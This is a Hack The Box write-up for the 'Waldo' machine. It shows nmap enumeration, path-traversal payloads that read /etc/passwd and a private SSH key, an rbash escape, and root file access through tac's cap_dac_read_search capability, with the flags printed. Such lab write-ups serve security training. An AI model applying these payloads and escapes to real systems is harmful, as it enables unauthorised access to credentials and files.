---
layout: writeup
name: "Waldo"
platform: "HackTheBox"
category: "retired"
difficulty: "Medium"
os: "Hack The Box"
date: 2025-11-12
pwned: true
---

# CTF Writeup Waldo - Hack The Box

## 🧪 Machine Name: `Waldo`

**Platform:** Hack The Box  
**IP Address:** `10.10.10.87`  
**Difficulty:** Medium

---

## 🛍️ Overview

Waldo is a medium difficulty machine highlighting the risk of insufficient input validation, restricted shell bypass (rbash escape), and privilege escalation via Linux Capabilities.

---

## 🔍 Enumeration

### 🔎 Nmap Scan

```bash
nmap -p- 10.10.10.87 --min-rate 10000
nmap -p 22,80,8888 10.10.10.87 -sCV -oN nmapscan
```

### 🌐 Web Enumeration

- Found `list manager` web app on port 80 using `list.js`  
- Discovered:
  - `dirRead.php`
  - `fileRead.php`

### 📂 Local File Inclusion (LFI)

```bash
POST /fileRead.php
file=....//....//....//....//etc/passwd
```

Found `nobody` user with `/bin/sh` shell.

### 🔑 SSH Key Discovery

```bash
POST /dirRead.php
path=....//....//....//....//home/nobody/.ssh

POST /fileRead.php
file=....//....//....//....//home/nobody/.ssh/.monitor
```

Retrieved private SSH key.

---

## 🐚 Foothold

### SSH Login as `nobody`

```bash
ssh -i .monitor nobody@10.10.10.87
```

Grabbed `user.txt`:

```bash
cat user.txt
b0e38105e739a6e079ef6a3a0e62fb67
```

### SSH to `monitor` user

Reused `.monitor` key:

```bash
ssh -i .monitor monitor@localhost
```

Found restricted shell `rbash`.  
Escaped with:

```bash
ssh -i .monitor monitor@localhost -t bash --noprofile

# Fix $PATH
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/bin:$PATH
```

---

## 🔍 Privilege Escalation

### Capability Enumeration

```bash
getcap -r /* 2>/dev/null
```

Found:

```bash
/usr/bin/tac = cap_dac_read_search+ei
```

### Abuse with `tac`

```bash
./tac /root/root.txt
eff2b317239aa0558a7031a66f33f350
```

---

## 🧠 Lessons Learned

- LFI to SSH Key Retrieval
- Restricted Shell (rbash) escape techniques
- Using `getcap` to enumerate Linux Capabilities
- Privesc via `cap_dac_read_search` using `tac`

---

*Writeup by inksec*  
*GitHub: [https://github.com/inkedqt]*
